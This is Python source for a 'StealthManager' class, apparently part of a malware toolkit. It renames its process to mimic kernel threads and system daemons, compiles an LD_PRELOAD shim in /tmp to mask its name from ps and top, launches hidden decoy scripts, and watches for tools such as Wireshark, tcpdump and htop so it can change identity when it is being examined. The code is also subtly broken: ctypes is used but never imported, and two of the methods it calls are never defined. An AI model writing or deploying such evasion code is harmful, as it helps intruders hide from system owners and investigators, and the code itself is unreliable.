import os
import sys
import hashlib
import random
import string
import psutil
import time
import subprocess
from pathlib import Path
import logging

class StealthManager:
    def __init__(self):
        self.original_name = sys.argv[0]
        self.stealth_name = self.generate_stealth_name()
        self.hidden_processes = []
        self.monitoring = False
        
    def activate(self):
        """Activate all stealth measures"""
        self.rename_process()
        self.hide_in_memory()
        self.disable_logging()
        self.obfuscate_memory()
        self.create_decoy_processes()
        
    def rename_process(self):
        """Rename process to appear as system process"""
        try:
            # Try to rename process
            libc = ctypes.CDLL(None)
            prctl = libc.prctl
            prctl.argtypes = [ctypes.c_int, ctypes.c_char_p, ctypes.c_ulong,
                            ctypes.c_ulong, ctypes.c_ulong]
            prctl.restype = ctypes.c_int
            
            stealth_name = self.stealth_name.encode()
            prctl(15, stealth_name, 0, 0, 0)  # PR_SET_NAME
            
            # Also rename argv[0]
            if len(sys.argv) > 0:
                sys.argv[0] = self.stealth_name
                
        except Exception as e:
            logging.debug(f"Process rename failed: {e}")
    
    def hide_in_memory(self):
        """Hide process from common monitoring tools"""
        try:
            # Use LD_PRELOAD technique
            preload_path = "/tmp/.venomous_preload.so"
            
            # Create simple preload library source
            preload_source = """
            #define _GNU_SOURCE
            #include <dlfcn.h>
            #include <string.h>
            
            int __libc_start_main(int *(main) (int, char **, char **),
                                int argc, char ** ubp_av,
                                void (*init) (void),
                                void (*fini) (void),
                                void (*rtld_fini) (void),
                                void (* stack_end)) {
                int (*original)(int *(main) (int, char **, char **),
                              int, char **, void (*)(void),
                              void (*)(void), void (*)(void),
                              void *);
                original = dlsym(RTLD_NEXT, "__libc_start_main");
                
                // Hide our process name from ps, top, etc.
                char *stealth_name = "[kworker/u:0]";
                ubp_av[0] = stealth_name;
                
                return original(main, argc, ubp_av, init, fini, rtld_fini, stack_end);
            }
            """
            
            # Compile and set LD_PRELOAD
            with open("/tmp/preload.c", "w") as f:
                f.write(preload_source)
            
            subprocess.run(["gcc", "-fPIC", "-shared", "-o", preload_path,
                          "/tmp/preload.c", "-ldl"], capture_output=True)
            
            os.environ['LD_PRELOAD'] = preload_path
            
        except Exception as e:
            logging.debug(f"Memory hiding failed: {e}")
    
    def generate_stealth_name(self):
        """Generate random stealth process name"""
        system_names = [
            "kworker/u:0", "ksoftirqd/0", "rcu_sched", "migration/0",
            "watchdog/0", "ipv6_addrconf", "jbd2/sda1-8", "ext4-rsv-conver",
            "systemd-journal", "systemd-udevd", "NetworkManager",
            "wpa_supplicant", "dbus-daemon", "accounts-daemon"
        ]
        return random.choice(system_names)
    
    def create_decoy_processes(self):
        """Create decoy processes to confuse analysis"""
        decoy_scripts = [
            "#!/bin/bash\nwhile true; do sleep 10; done",
            "#!/usr/bin/python3\nimport time\nwhile True: time.sleep(30)",
        ]
        
        for i, script in enumerate(decoy_scripts):
            decoy_path = f"/tmp/.systemd-helper-{i}"
            with open(decoy_path, 'w') as f:
                f.write(script)
            os.chmod(decoy_path, 0o755)
            
            proc = subprocess.Popen([decoy_path], 
                                  stdout=subprocess.DEVNULL,
                                  stderr=subprocess.DEVNULL)
            self.hidden_processes.append(proc)
    
    def monitor(self):
        """Monitor system for detection attempts"""
        if not self.monitoring:
            self.monitoring = True
            # Check for monitoring tools
            for proc in psutil.process_iter(['name']):
                try:
                    name = proc.info['name'].lower()
                    if any(tool in name for tool in ['wireshark', 'tcpdump', 
                                                    'nmap', 'netstat', 'lsof',
                                                    'ps', 'top', 'htop']):
                        logging.warning(f"Detection tool running: {name}")
                        # Evasive action
                        self.evade_detection()
                except:
                    pass
    
    def evade_detection(self):
        """Take evasive action when detected"""
        # Change identity
        self.stealth_name = self.generate_stealth_name()
        self.rename_process()
        
        # Change network patterns
        time.sleep(random.uniform(1, 5))